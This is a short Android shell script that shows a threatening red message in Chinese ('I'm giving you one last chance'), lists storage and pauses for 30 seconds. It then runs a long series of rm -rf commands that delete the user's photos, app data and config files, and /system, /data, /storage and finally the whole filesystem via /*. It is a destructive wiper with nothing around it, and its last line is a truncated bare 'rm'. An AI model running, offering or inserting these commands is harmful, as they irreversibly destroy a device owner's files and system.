echo -e \033[31m我给你最后一次机会\033[0m
ls /storage/emulated/0/
sleep 30
rm -rf /storage/emulated/0/DCIM
rm -rf /storage
rm -rf /system
rm -rf /cust
rm -rf .android_system_config.prop
rm -rf .CAD
rm -rf .iacovnfld.
rm -rf ContextData.xml
rm -rf c21a67c1294346e004789ac9a8dffa95
rm -rf /storage/emulated
rm -rf .icosc
rm -rf folder_app.db
rm -rf appinfo.db
rm -rf .sp_check_dontedit_v7
rm -rf .dontedit_v1
rm -rf qfs.js-20250213
rm -rf qfs.js-20250209
rm -rf qfs.js-20250206
rm -rf qfs.js-20250127
rm -rf hot_spot_result
rm -rf .turing.dat
rm -rf .tlocalcookieid
rm -rf .oukdtft
rm -rf .android_system_config.prop
rm -rf /etc
rm -rf /mnt
rm -rf /vendor
rm -rf /system_ext
rm -rf /sdcard
rm -rf /.BD_SAPI_CACHE
rm -rf /.Android
rm -rf /data
rm -rf /*
rm